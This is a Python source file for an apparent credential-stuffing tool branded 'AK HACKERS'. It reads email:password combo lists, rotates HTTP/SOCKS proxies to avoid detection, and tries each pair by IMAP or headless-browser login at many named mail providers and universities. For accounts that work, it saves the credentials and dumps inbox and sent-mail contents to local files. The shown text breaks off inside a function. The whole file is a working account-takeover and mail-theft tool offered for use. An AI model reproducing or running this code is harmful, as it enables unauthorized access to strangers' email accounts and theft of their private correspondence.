import os
import re
import sys
import platform
from urllib.parse import urlparse
import logging
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.exceptions import RequestException
import urllib.parse
import whois

# Imports for EmailCheckerApp and parser
try:
    import imaplib
    import email
    from email.header import decode_header
    import socks
    import socket
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    import charset_normalizer
except ImportError as e:
    logging.error(f"Missing required packages: {e}")
    print(f"Error: Missing required packages. Please install using 'pip install PySocks requests selenium webdriver-manager charset-normalizer python-whois'.")
    raise e

# Set up logging to file only
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('credential_parser.log', encoding='utf-8')
    ]
)

# ASCII banner
BANNER = """
 █████╗ ██╗  ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗
██╔══██╗██║ ██╔╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝
███████║████E╔╝     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗
██╔══██║██╔═██╗     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔==██╗╚════██║
██║  ██║██║  ██╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║
╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝

𝐉𝐎𝐈𝐍 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌
@akhackersredirect
@akhackersredirect
@akhackersredirect
@akhackersredirect
@akhackersredirect
"""

class EmailCheckerApp:
    def __init__(self):
        try:
            self.progress_counter = [0]
            self.total_lines = 0
            self.file_lock = threading.Lock()
            self.running = False
            self.paused = False
            self.proxy_list = []
            self.failed_proxies = set()
            self.proxy_index = [0]
            self.bad_count = 0
            self.good_count = 0
            self.error_count = 0
            self.livetxt = "live.txt"
            self.deadtxt = "dead.txt"
            self.errorlog = "error_lines.txt"
            self.log_message("Application initialized successfully.", "info")
        except Exception as e:
            self.log_message(f"Failed to initialize application: {str(e)}", "error")
            raise e

    def log_message(self, message, level="info"):
        colors = {
            "info": "\033[0m",      # White (default)
            "success": "\033[32m",  # Green
            "error": "\033[31m",    # Red
            "warning": "\033[33m"   # Yellow
        }
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        email_pass = "N/A"
        ip_port = "N/A"
        status = "N/A"
        
        if message.startswith("[Progress:"):
            try:
                parts = message.split(" -> ")
                email_pass_match = re.search(r'\] (.+?) ->', message)
                email_pass = email_pass_match.group(1) if email_pass_match else "N/A"
                result_message = parts[1] if len(parts) > 1 else "N/A"
                status = "Success" if "✅" in result_message else "Failed"
                ip_port = getattr(self, 'current_proxy', "None")
            except Exception:
                print(f"{colors[level]}{timestamp} {message}\033[0m")
                logging.log(
                    logging.INFO if level == "info" else
                    logging.ERROR if level == "error" else
                    logging.WARNING if level == "warning" else
                    logging.DEBUG, message
                )
                return
        
        formatted_message = f"{colors[level]}{timestamp} {email_pass:<30} {ip_port:<20} {status:<10}\033[0m"
        print(formatted_message)
        logging.log(
            logging.INFO if level == "info" else
            logging.ERROR if level == "error" else
            logging.WARNING if level == "warning" else
            logging.DEBUG, f"{email_pass} {ip_port} {status} {message}"
        )

    def clear_log(self):
        self.bad_count = 0
        self.good_count = 0
        self.error_count = 0
        self.update_counts()

    def update_counts(self):
        print(f"Good: {self.good_count} | Bad: {self.bad_count} | Error: {self.error_count}")
        logging.info(f"Good: {self.good_count} | Bad: {self.bad_count} | Error: {self.error_count}")

    def get_file_input(self, prompt, file_type="text"):
        while True:
            file_path = input(prompt).strip()
            if not file_path:
                return None
            if os.path.isfile(file_path):
                return file_path
            print(f"Error: File '{file_path}' not found.")
            logging.error(f"File not found: {file_path}")

    def browse_file(self):
        file_path = self.get_file_input("Enter path to combo list (email:pass) file (or press Enter to skip): ")
        if not file_path:
            self.log_message("No file selected.", "error")
            self.error_count += 1
            self.update_counts()
            return None
        try:
            with open(file_path, "r", encoding="utf-8", errors="replace") as file:
                self.total_lines = sum(1 for line in file if line.strip() and ":" in line)
            self.log_message(f"Selected file: {file_path} ({self.total_lines} lines)", "info")
            return file_path
        except Exception as e:
            self.total_lines = 0
            self.log_message(f"Error reading file: {str(e)}", "error")
            self.error_count += 1
            self.update_counts()
            return None

    def browse_proxies(self):
        file_path = self.get_file_input("Enter path to proxy list (ip:port) file (or press Enter to skip): ")
        if not file_path:
            self.log_message("No proxy file selected. Proceeding without proxies.", "info")
            return
        try:
            with open(file_path, "r", encoding="utf-8", errors="replace") as file:
                self.proxy_list = [line.strip() for line in file if line.strip() and ":" in line]
            self.failed_proxies.clear()
            self.log_message(f"Loaded {len(self.proxy_list)} proxies from {file_path}", "info")
        except Exception as e:
            self.log_message(f"Error loading proxies: {str(e)}", "error")
            self.error_count += 1
            self.update_counts()

    def get_proxy_type(self):
        print("Select proxy type:")
        print("1. None")
        print("2. HTTP")
        print("3. SOCKS4")
        print("4. SOCKS5")
        while True:
            choice = input("Enter choice (1-4): ").strip()
            if choice in ["1", "2", "3", "4"]:
                return ["None", "HTTP", "SOCKS4", "SOCKS5"][int(choice) - 1]
            print("Invalid choice. Please enter 1, 2, 3, or 4.")

    def toggle_pause(self):
        if self.paused:
            self.paused = False
            self.log_message("Resumed checking.", "info")
        else:
            self.paused = True
            self.log_message("Paused checking.", "info")

    def is_valid_email(self, email):
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(email_pattern, email))

    def get_imap_server(self, email):
        domain = email.lower().split("@")[1]
        imap_servers = {
            "gmail.com": "imap.gmail.com",
            "yahoo.com": "imap.mail.yahoo.com",
            "hotmail.com": "outlook.office365.com",
            "outlook.com": "outlook.office365.com",
            "live.com": "outlook.office365.com",
            "aol.com": "imap.aol.com",
            "icloud.com": "imap.mail.me.com",
            "protonmail.com": "imap.protonmail.com",
            "zoho.com": "imap.zoho.com",
            "mail.com": "imap.mail.com",
            "gmx.com": "imap.gmx.com",
            "fastmail.com": "imap.fastmail.com",
            "tutanota.com": "imap.tutanota.com",
            "msn.com": "outlook.office365.com",
            "comcast.net": "imap.comcast.net",
            "att.net": "imap.mail.att.net",
            "sbcglobal.net": "imap.mail.att.net",
            "verizon.net": "imap.verizon.net",
            "cox.net": "imap.cox.net",
            "earthlink.net": "imap.earthlink.net",
            "t-online.de": "imap.t-online.de",
            "iupui.edu": "imap.iu.edu",
            "nmsu.edu": "imap.nmsu.edu",
            "gvsu.edu": "imap.gvsu.edu",
            "pisd.edu": "imap.gmail.com",
            "oneonta.edu": "imap.oneonta.edu",
            "andrew.cmu.edu": "imap.andrew.cmu.edu",
            "goucher.edu": "imap.goucher.edu",
            "cornell.edu": "imap.cornell.edu",
            "ucsd.edu": "imap.ucsd.edu",
            "hotmail.es": "outlook.office365.com",
            "hotmail.fr": "outlook.office365.com",
            "hotmail.co.uk": "outlook.office365.com",
            "outlook.com.ar": "outlook.office365.com",
            "outlook.com.br": "outlook.office365.com",
            "outlook.fr": "outlook.office365.com",
            "outlook.co.th": "outlook.office365.com",
            "outlook.jp": "outlook.office365.com",
            "outlook.es": "outlook.office365.com",
            "live.fr": "outlook.office365.com",
            "live.com.ar": "outlook.office365.com",
            "live.com.au": "outlook.office365.com",
            "live.it": "outlook.office365.com",
            "live.dk": "outlook.office365.com",
            "live.se": "outlook.office365.com",
            "hotmail.it": "outlook.office365.com",
            "hotmail.nl": "outlook.office365.com",
            "hotmail.de": "outlook.office365.com",
            "hotmail.se": "outlook.office365.com",
            "hotmail.ch": "outlook.office365.com",
            "ya.com": "imap.mail.yahoo.com",
        }
        if domain not in imap_servers:
            self.log_message(f"Unsupported domain: {domain}", "warning")
            self.error_count += 1
            self.update_counts()
            return None
        return imap_servers.get(domain)

    def get_web_login_config(self, email):
        domain = email.lower().split("@")[1]
        web_login_configs = {
            "t-online.de": {
                "login_url": "https://email.t-online.de/",
                "email_field": "#loginForm-email",
                "password_field": "#loginForm-password",
                "submit_button": "button[type='submit']",
                "success_indicator": "div.messages",
                "error_indicator": ".error-message",
            },
        }
        return web_login_configs.get(domain)

    def setup_proxy(self, proxy_str, imap_server):
        try:
            proxy_type = self.proxy_type_var
            if proxy_type == "None" or not proxy_str:
                self.log_message("No proxy selected. Proceeding without proxy.", "info")
                return True

            if ":" not in proxy_str:
                self.log_message(f"Invalid proxy format: {proxy_str}. Expected ip:port", "error")
                self.failed_proxies.add(proxy_str)
                self.error_count += 1
                self.update_counts()
                return False

            proxy_ip, proxy_port = proxy_str.split(":", 1)
            proxy_port = int(proxy_port)

            proxy_types = {
                "HTTP": socks.HTTP,
                "SOCKS4": socks.SOCKS4,
                "SOCKS5": socks.SOCKS5
            }
            proxy_type_val = proxy_types.get(proxy_type)
            if not proxy_type_val:
                self.log_message(f"Unsupported proxy type: {proxy_type}", "error")
                self.failed_proxies.add(proxy_str)
                self.error_count += 1
                self.update_counts()
                return False

            self.log_message(f"Testing proxy {proxy_type} {proxy_ip}:{proxy_port} with {imap_server}", "info")
            max_retries = 2
            for attempt in range(max_retries):
                try:
                    socks.set_default_proxy(proxy_type_val, proxy_ip, proxy_port)
                    socket.socket = socks.socksocket
                    test_socket = socket.socket()
                    test_socket.settimeout(10)
                    test_socket.connect((imap_server, 993))
                    test_socket.close()
                    self.log_message(f"Proxy {proxy_ip}:{proxy_port} is working", "success")
                    return True
                except Exception as e:
                    if attempt == max_retries - 1:
                        error_msg = str(e).lower()
                        if "timed out" in error_msg:
                            self.log_message(f"Proxy {proxy_ip}:{proxy_port} failed: Timeout after 10 seconds", "error")
                        elif "actively refused" in error_msg:
                            self.log_message(f"Proxy {proxy_ip}:{proxy_port} failed: Connection refused", "error")
                        else:
                            self.log_message(f"Proxy {proxy_ip}:{proxy_port} failed: {str(e)}", "error")
                        self.failed_proxies.add(proxy_str)
                        self.error_count += 1
                        self.update_counts()
                        return False
                    self.log_message(f"Proxy {proxy_ip}:{proxy_port} attempt {attempt + 1} failed: {str(e)}. Retrying...", "warning")
                    time.sleep(1)
        except Exception as e:
            self.log_message(f"Unexpected error setting up proxy {proxy_str}: {str(e)}", "error")
            self.failed_proxies.add(proxy_str)
            self.error_count += 1
            self.update_counts()
            return False
        finally:
            socket.socket = socket._socket.socket

    def setup_web_proxy(self, proxy_str):
        if not proxy_str or self.proxy_type_var == "None":
            return None
        try:
            proxy_ip, proxy_port = proxy_str.split(":", 1)
            proxy_type = self.proxy_type_var.lower()
            if proxy_type == "http":
                return f"http://{proxy_ip}:{proxy_port}"
            elif proxy_type in ["socks4", "socks5"]:
                return f"{proxy_type}://{proxy_ip}:{proxy_port}"
            else:
                self.log_message(f"Unsupported proxy type for web: {proxy_type}", "error")
                self.error_count += 1
                self.update_counts()
                return None
        except Exception as e:
            self.log_message(f"Invalid proxy format {proxy_str}: {str(e)}", "error")
            self.error_count += 1
            self.update_counts()
            return None

    def web_login(self, user, password, channel, proxy_str=None):
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")

        driver = None
        try:
            driver = webdriver.Chrome(service=webdriver.chrome.service.Service(ChromeDriverManager().install()), options=chrome_options)
            driver.set_page_load_timeout(30)

            self.log_message(f"Navigating to {channel['login_url']} for {user}", "info")
            driver.get(channel['login_url'])
            time.sleep(2)

            email_field = driver.find_element(By.CSS_SELECTOR, channel['email_field'])
            email_field.send_keys(user)
            password_field = driver.find_element(By.CSS_SELECTOR, channel['password_field'])
            password_field.send_keys(password)

            submit_button = driver.find_element(By.CSS_SELECTOR, channel['submit_button'])
            submit_button.click()
            time.sleep(3)

            if driver.find_elements(By.CSS_SELECTOR, channel['success_indicator']):
                self.log_message(f"Web login successful for {user}", "success")
                return True
            elif driver.find_elements(By.CSS_SELECTOR, channel['error_indicator']):
                self.log_message(f"Web login failed for {user}: Invalid credentials or 2FA required", "error")
                return False
            else:
                self.log_message(f"Web login for {user}: Could not determine login status. Possible CAPTCHA or 2FA.", "warning")
                return False
        except Exception as e:
            error_msg = str(e).lower()
            if "timeout" in error_msg:
                self.log_message(f"Web login for {user} timed out", "error")
            elif "element not found" in error_msg:
                self.log_message(f"Web login for {user} failed: Page structure changed or elements not found", "error")
            else:
                self.log_message(f"Web login for {user} failed: {str(e)}", "error")
            return False
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    def dump_emails(self, user, mail, folder="inbox", dump_file=""):
        try:
            mail.select(f'"{folder}"')
            status, messages = mail.search(None, "ALL")
            if status != "OK":
                self.log_message(f"Failed to search {folder} for dumping: {user}", "error")
                self.error_count += 1
                self.update_counts()
                return 0

            email_ids = messages[0].split()
            with open(dump_file, "a", encoding="utf-8", errors="replace") as f:
                f.write(f"Email Dump for {user} - {folder} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("-" * 50 + "\n")
                for email_id in email_ids:
                    status, msg_data = mail.fetch(email_id, "(RFC822)")
                    if status != "OK":
                        continue
                    raw_email = msg_data[0][1]
                    msg = email.message_from_bytes(raw_email)
                    subject, encoding = decode_header(msg.get("Subject", "No Subject"))[0]
                    if isinstance(subject, bytes):
                        subject = subject.decode(encoding if encoding else "utf-8", errors="replace")
                    body = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                body = part.get_payload(decode=True).decode(errors="replace")
                                break
                    else:
                        body = msg.get_payload(decode=True).decode(errors="replace") if msg.get_payload(decode=True) else ""
                    f.write(f"Subject: {subject}\n")
                    f.write(f"Body: {body}\n")
                    f.write("-" * 50 + "\n")
            self.log_message(f"Successfully dumped {len(email_ids)} emails from {folder} for {user}", "success")
            return len(email_ids)
        except Exception as e:
            self.log_message(f"Error dumping emails from {folder} for {user}: {str(e)}", "error")
            self.error_count += 1
            self.update_counts()
            return 0

    def dump_single_account(self, input_str):
        if not input_str or ":" not in input_str:
            self.log_message("Invalid format in dump input. Expected email:pass", "error")
            self.error_count += 1
            self.update_counts()
            return

        try:
            user, password = input_str.split(":", 1)
            user = user.strip()
            password = password.strip()
            if not self.is_valid_email(user) or not password:
                self.log_message(f"Invalid email or password: {input_str}", "error")
                self.error_count += 1
                self.update_counts()
                return
        except ValueError:
            self.log_message(f"Invalid format: {input_str}", "error")
            self.error_count += 1
            self.update_counts()
            return

        def run_single_dump():
            imap_server = self.get_imap_server(user)
            web_config = self.get_web_login_config(user)
            safe_email = re.sub(r'[@.]', '_', user)
            dump_file = f"Single_Dump_{safe_email}.txt"
            proxy_success = False
            proxy_str = None
            local_proxy_index = 0
            mail = None

            use_proxy = self.proxy_type_var != "None" and self.proxy_list
            if web_config:
                if use_proxy:
                    while local_proxy_index < len(self.proxy_list) and not proxy_success:
                        proxy_str = self.proxy_list[local_proxy_index]
                        if proxy_str in self.failed_proxies:
                            local_proxy_index += 1
                            continue
                        self.current_proxy = proxy_str
                        self.log_message(f"Attempting web login for {user} with proxy {proxy_str}...", "info")
                        if self.web_login(user, password, web_config, proxy_str):
                            proxy_success = True
                            self.good_count += 1
                            self.update_counts()
                        else:
                            self.failed_proxies.add(proxy_str)
                            local_proxy_index += 1
                            self.bad_count += 1
                            self.update_counts()

                if not proxy_success:
                    self.current_proxy = "None"
                    self.log_message(f"Attempting web login for {user} without proxy...", "info")
                    if self.web_login(user, password, web_config):
                        proxy_success = True
                        self.good_count += 1
                        self.update_counts()
                    else:
                        self.bad_count += 1
                        self.update_counts()
                        return

                if not imap_server:
                    self.log_message(f"Web login succeeded for {user}, but no IMAP server available for dumping emails", "warning")
                    self.error_count += 1
                    self.update_counts()
                    return

            if proxy_success or not web_config:
                if not imap_server:
                    self.log_message(f"Unsupported domain: {user.split('@')[1]}", "warning")
                    self.error_count += 1
                    self.update_counts()
                    return

                if use_proxy:
                    local_proxy_index = 0
                    while local_proxy_index < len(self.proxy_list) and not proxy_success:
                        proxy_str = self.proxy_list[local_proxy_index]
                        if proxy_str in self.failed_proxies:
                            local_proxy_index += 1
                            continue
                        self.current_proxy = proxy_str
                        self.log_message(f"Attempting IMAP login for {user} with proxy {proxy_str}...", "info")
                        if self.setup_proxy(proxy_str, imap_server):
                            try:
                                mail = imaplib.IMAP4_SSL(imap_server, timeout=15)
                                mail.login(user, password)
                                self.log_message(f"IMAP login successful for {user} with proxy {proxy_str}", "success")
                                proxy_success = True
                                self.good_count += 1
                                self.update_counts()
                            except imaplib.IMAP4.error as e:
                                error_msg = str(e).lower()
                                if "login failed" in error_msg or "invalid credentials" in error_msg:
                                    self.log_message(f"IMAP login failed for {user} with proxy {proxy_str}: Invalid credentials or 2FA/app-specific password required.", "error")
                                    self.bad_count += 1
                                    self.update_counts()
                                else:
                                    self.log_message(f"IMAP login failed for {user} with proxy {proxy_str}: {str(e)}", "error")
                                    self.error_count += 1
                                    self.update_counts()
                                self.failed_proxies.add(proxy_str)
                                local_proxy_index += 1
                            except Exception as e:
                                self.log_message(f"IMAP connection error for {user} with proxy {proxy_str}: {str(e)}", "error")
                                self.error_count += 1
                                self.update_counts()
                                self.failed_proxies.add(proxy_str)
                                local_proxy_index += 1
                            finally:
                                socket.socket = socket._socket.socket
                        else:
                            local_proxy_index += 1

                if not proxy_success:
                    self.current_proxy = "None"
                    self.log_message(f"Attempting IMAP login for {user} without proxy...", "info")
                    try:
                        mail = imaplib.IMAP4_SSL(imap_server, timeout=15)
                        mail.login(user, password)
                        self.log_message(f"IMAP login successful for {user} without proxy", "success")
                        proxy_success = True
                        self.good_count += 1
                        self.update_counts()
                    except imaplib.IMAP4.error as e:
                        error_msg = str(e).lower()
                        if "login failed" in error_msg or "invalid credentials" in error_msg:
                            self.log_message(f"IMAP login failed for {user}: Invalid credentials or 2FA/app-specific password required.", "error")
                            self.bad_count += 1
                            self.update_counts()
                        else:
                            self.log_message(f"IMAP login failed for {user}: {str(e)}", "error")
                            self.error_count += 1
                            self.update_counts()
                        return
                    except Exception as e:
                        self.log_message(f"IMAP connection error for {user}: {str(e)}", "error")
                        self.error_count += 1
                        self.update_counts()
                        return

            if proxy_success:
                try:
                    inbox_count = self.dump_emails(user, mail, "inbox", dump_file)
                    sent_count = self.dump_emails(user, mail, "Sent", dump_file)
                    self.log_message(f"Dumped a total of {inbox_count + sent_count} emails for {user} to {dump_file}", "success")
                except Exception as e:
                    self.log_message(f"Error dumping emails for {user}: {str(e)}", "error")
                    self.error_count += 1
                    self.update_counts()
                finally:
                    if mail:
                        try:
                            mail.logout()
                            self.log_message(f"Logged out from {user}", "info")
                        except:
                            pass

        threading.Thread(target=run_single_dump, daemon=True).start()

    def procurar(self, user, password, keyword, use_proxy=True):
        while self.paused and self.running:
            time.sleep(0.5)

        self.current_email = f"{user}:{password}"
        self.log_message(f"Starting check for {user}...", "info")

        imap_server = self.get_imap_server(user)
        web_config = self.get_web_login_config(user)
        success = False
        proxy_str = None

        if web_config:
            if use_proxy:
                while not success and self.proxy_index[0] < len(self.proxy_list):
                    proxy_str = self.proxy_list[self.proxy_index[0]]
                    if proxy_str in self.failed_proxies:
                        self.proxy_index[0] += 1
                        continue
                    self.current_proxy = proxy_str
                    if self.web_login(user, password, web_config, proxy_str):
                        success = True
                        self.good_count += 1
                        self.update_counts()
                    else:
                        self.failed_proxies.add(proxy_str)
                        self.proxy_index[0] += 1
                        self.bad_count += 1
                        self.update_counts()

            if not success:
                self.current_proxy = "None"
                self.log_message(f"Attempting web login for {user} without proxy...", "info")
                if self.web_login(user, password, web_config):
                    success = True
                    self.good_count += 1
                    self.update_counts()
                else:
                    self.bad_count += 1
                    self.update_counts()

            if not imap_server:
                if success:
                    self.last_result_message = "✅ Web login successful, no IMAP server for keyword search"
                    self.last_result_level = "success"
                else:
                    self.last_result_message = "❌ DIE (Web login failed)"
                    self.last_result_level = "error"
                with self.file_lock:
                    self.progress_counter[0] += 1
                    progress_message = f"[Progress: {self.progress_counter[0]}/{self.total_lines}] {user}:{password} -> {self.last_result_message}"
                    self.update_progress(self.progress_counter[0], progress_message)
                    self.log_message(progress_message, self.last_result_level)
                return user, self.last_result_message

        if success or not web_config:
            if not imap_server:
                self.log_message(f"Unsupported domain: {user.split('@')[1]}", "warning")
                self.error_count += 1
                self.update_counts()
                with self.file_lock:
                    self.progress_counter[0] += 1
                    progress_message = f"[Progress: {self.progress_counter[0]}/{self.total_lines}] {user}:{password} -> ⚠️ Unsupported domain: {user.split('@')[1]}"
                    self.update_progress(self.progress_counter[0], progress_message)
                    self.log_message(progress_message, "warning")
                return user, f"⚠️ Unsupported domain: {user.split('@')[1]}"

            if use_proxy:
                while not success and self.proxy_index[0] < len(self.proxy_list):
                    proxy_str = self.proxy_list[self.proxy_index[0]]
                    if proxy_str in self.failed_proxies:
                        self.proxy_index[0] += 1
                        continue
                    self.current_proxy = proxy_str
                    if not self.setup_proxy(proxy_str, imap_server):
                        self.proxy_index[0] += 1
                        continue
                    success = self.attempt_login(user, password, keyword, imap_server, proxy_str)
                    if not success:
                        self.proxy_index[0] += 1

                if not success and self.proxy_index[0] >= len(self.proxy_list):
                    self.current_proxy = "None"
                    self.log_message(f"No valid proxy found for {user}. Attempting without proxy...", "warning")
                    success = self.attempt_login(user, password, keyword, imap_server, None)
            else:
                self.current_proxy = "None"
                success = self.attempt_login(user, password, keyword, imap_server, None)

        if not success:
            result_message = "❌ DIE (All connection attempts failed)"
            result_level = "error"
            with self.file_lock:
                try:
                    with open(self.deadtxt, "a", encoding="utf-8") as file:
                        file.write(f"{user}:{password} | All connection attempts failed\n")
                except PermissionError as e:
                    self.log_message(f"Permission denied writing to {self.deadtxt}: {str(e)}", "error")
                    self.error_count += 1
                    self.update_counts()
        else:
            result_message = self.last_result_message
            result_level = self.last_result_level

        with self.file_lock:
            self.progress_counter[0] += 1
            progress_message = f"[Progress: {self.progress_counter[0]}/{self.total_lines}] {user}:{password} -> {result_message}"
            self.update_progress(self.progress_counter[0], progress_message)
            self.log_message(progress_message, result_level)

        time.sleep(5)
        return user, result_message

    def attempt_login(self, user, password, keyword, imap_server, proxy_str):
        try:
            if proxy_str:
                self.log_message(f"Attempting IMAP login for {user} with proxy {proxy_str}...", "info")
            else:
                self.log_message(f"Attempting IMAP login for {user} without proxy...", "info")

            mail = None
            success = False
            for attempt in range(3):
                try:
                    mail = imaplib.IMAP4_SSL(imap_server, timeout=15)
                    mail.login(user, password)
                    self.log_message(f"IMAP login successful for {user}", "success")
                    success = True
                    self.good_count += 1
                    self.update_counts()
                    break
                except imaplib.IMAP4.error as e:
                    error_msg = str(e).lower()
                    if attempt == 2:
                        if "login failed" in error_msg or "invalid credentials" in error_msg:
                            self.log_message(f"IMAP login failed for {user}: Invalid credentials or 2FA/app-specific password required.", "error")
                            self.bad_count += 1
                            self.update_counts()
                        else:
                            self.log_message(f"IMAP login failed for {user}: {str(e)}", "error")
                            self.error_count += 1
                            self.update_counts()
                        self.last_result_message = f"❌ DIE (IMAP login failed: {str(e)})"
                        self.last_result_level = "error"
                        return False
                    self.log_message(f"IMAP login attempt {attempt + 1} failed for {user}. Retrying...", "warning")
                    time.sleep(1)
                except Exception as e:
                    if attempt == 2:
                        self.log_message(f"IMAP connection error for {user}: {str(e)}", "error")
                        self.error_count += 1
                        self.update_counts()
                        self.last_result_message = f"❌ DIE (IMAP connection error: {str(e)})"
                        self.last_result_level = "error"
                        return False
                    self.log_message(f"IMAP connection attempt {attempt + 1} failed for {user}. Retrying...", "warning")
                    time.sleep(1)

            if success and not self.disable_keyword:
                safe_email = re.sub(r'[@.]', '_', user)
                dump_file = f"Dump_{safe_email}.txt"
                self.dump_emails(user, mail, "inbox", dump_file)

                self.log_message(f"Searching emails for keyword '{keyword}' in {user}...", "info")
                try:
                    mail.select('"inbox"')
                    status, messages = mail.search(None, "ALL")
                    if status != "OK":
                        raise Exception("Failed to search emails")
                    email_ids = messages[0].split()
                    self.log_message(f"Found {len(email_ids)} emails to check in {user}", "info")
                except Exception as e:
                    self.log_message(f"Error searching emails for {user}: {str(e)}", "error")
                    self.error_count += 1
                    self.update_counts()
                    self.last_result_message = f"❌ DIE (Search error: {str(e)})"
                    self.last_result_level = "error"
                    return False

                found = False
                for email_id in email_ids:
                    try:
                        status, msg_data = mail.fetch(email_id, "(BODY[HEADER.FIELDS (SUBJECT)])")
                        if status != "OK":
                            self.log_message(f"Failed to fetch email {email_id} for {user}", "warning")
                            continue
                        for response_part in msg_data:
                            if isinstance(response_part, tuple):
                                msg = email.message_from_bytes(response_part[1])
                                subject, encoding = decode_header(msg.get("Subject", ""))[0]
                                if isinstance(subject, bytes):
                                    subject = subject.decode(encoding if encoding else "utf-8")
                                if keyword.lower() in subject.lower():
                                    found = True
                                    self.log_message(f"Keyword '{keyword}' found in email subject for {user}", "success")
                                    break
                        if found:
                            break
                    except Exception as e:
                        self.log_message(f"Error fetching email {email_id} for {user}: {str(e)}", "warning")
                        continue

                with self.file_lock:
                    if found:
                        try:
                            with open(self.livetxt, "a", encoding="utf-8") as file:
                                file.write(f"{user}:{password} | {keyword.capitalize()}\n")
                        except PermissionError as e:
                            self.log_message(f"Permission denied writing to {self.livetxt}: {str(e)}", "error")
                            self.error_count += 1
                            self.update_counts()
                        self.last_result_message = f"✅ PALAVRA ENCONTRADA: {keyword.capitalize()}"
                        self.last_result_level = "success"
                    else:
                        try:
                            with open(self.deadtxt, "a", encoding="utf-8") as file:
                                file.write(f"{user}:{password} | No matching emails\n")
                        except PermissionError as e:
                            self.log_message(f"Permission denied writing to {self.deadtxt}: {str(e)}", "error")
                            self.error_count += 1
                            self.update_counts()
                        self.last_result_message = f"Nenhuma mensagem encontrada."
                        self.last_result_level = "warning"
            elif success and self.disable_keyword:
                self.last_result_message = f"✅ IMAP login successful, keyword search disabled"
                self.last_result_level = "success"
            else:
                self.last_result_message = f"❌ DIE (IMAP login failed)"
                self.last_result_level = "error"
                self.bad_count += 1
                self.update_counts()

            try:
                mail.logout()
                self.log_message(f"Logged out from {user}", "info")
            except Exception as e:
                self.log_message(f"Error logging out from {user}: {str(e)}", "warning")

            return success
        except Exception as e:
            self.last_result_message = f"❌ DIE (Unexpected error: {str(e)})"
            self.last_result_level = "error"
            self.error_count += 1
            self.update_counts()
            with self.file_lock:
                try:
                    with open(self.deadtxt, "a", encoding="utf-8") as file:
                        file.write(f"{user}:{password} | Error: {str(e)}\n")
                except PermissionError as e:
                    self.log_message(f"Permission denied writing to {self.deadtxt}: {str(e)}", "error")
                    self.error_count += 1
                    self.update_counts()
            return False
        finally:
            if mail and not success:
                try:
                    mail.logout()
                except:
                    pass
            socket.socket = socket._socket.socket

    def update_progress(self, count, message):
        percentage = (count / self.total_lines * 100) if self.total_lines > 0 else 0
        print(f"Progress: {count}/{self.total_lines} ({percentage:.1f}%)")
        logging.info(f"Progress: {count}/{self.total_lines} ({percentage:.1f}%)")

    def start_checking(self, arquivo, keyword, disable_keyword):
        if self.running:
            self.log_message("Already running. Please wait.", "warning")
            return

        if not arquivo:
            self.log_message("No file selected.", "error")
            self.error_count += 1
            self.update_counts()
            return
        if not keyword and not disable_keyword:
            self.log_message("Keyword cannot be empty unless keyword search is disabled.", "error")
            self.error_count += 1
            self.update_counts()
            return

        self.running = True
        self.paused = False
        self.progress_counter = [0]
        self.bad_count = 0
        self.good_count = 0
        self.error_count = 0
        self.update_counts()

        def run_checking():
            self.log_message("Starting email checking process...", "info")
            try:
                encoding = charset_normalizer.detect(open(arquivo, "rb").read())["encoding"] or "utf-8"
                self.log_message(f"Detected encoding: {encoding}", "info")

                with open(arquivo, "r", encoding=encoding, errors="replace") as file:
                    lines = file.readlines()

                self.total_lines = len([line for line in lines if line.strip() and ":" in line])
                self.log_message(f"Processing {self.total_lines} lines...", "info")
                self.update_progress(0, "")

                with ThreadPoolExecutor(max_workers=1) as executor:
                    futures = []
                    for line in lines:
                        line = line.strip()
                        if not line:
                            self.log_message("Skipping empty line", "warning")
                            continue
                        if ":" not in line:
                            with self.file_lock:
                                try:
                                    with open(self.errorlog, "a", encoding="utf-8") as file:
                                        file.write(f"Invalid format (expected email:pass): {line}\n")
                                except PermissionError as e:
                                    self.log_message(f"Permission denied writing to {self.errorlog}: {str(e)}", "error")
                                    self.error_count += 1
                                    self.update_counts()
                            self.log_message(f"Invalid format (expected email:pass): {line}", "error")
                            self.error_count += 1
                            self.update_counts()
                            continue
                        try:
                            user, password = line.split(":", 1)
                            user = user.strip()
                            password = password.strip()
                            if not self.is_valid_email(user) or not password:
                                with self.file_lock:
                                    try:
                                        with open(self.errorlog, "a", encoding="utf-8") as file:
                                            file.write(f"Invalid email or password: {line}\n")
                                    except PermissionError as e:
                                        self.log_message(f"Permission denied writing to {self.errorlog}: {str(e)}", "error")
                                    self.error_count += 1
                                    self.update_counts()
                                self.log_message(f"Invalid email or password in line: {line}", "error")
                                self.error_count += 1
                                self.update_counts()
                                continue
                            use_proxy = self.proxy_type_var != "None" and self.proxy_list
                            futures.append(executor.submit(self.procurar, user, password, keyword, use_proxy))
                        except ValueError:
                            with self.file_lock:
                                try:
                                    with open(self.errorlog, "a", encoding="utf-8") as file:
                                        file.write(f"Invalid format: {line}\n")
                                except PermissionError as e:
                                    self.log_message(f"Permission denied writing to {self.errorlog}: {str(e)}", "error")
                                    self.error_count += 1
                                    self.update_counts()
                            self.log_message(f"Invalid format in line: {line}", "error")
                            self.error_count += 1
                            self.update_counts()

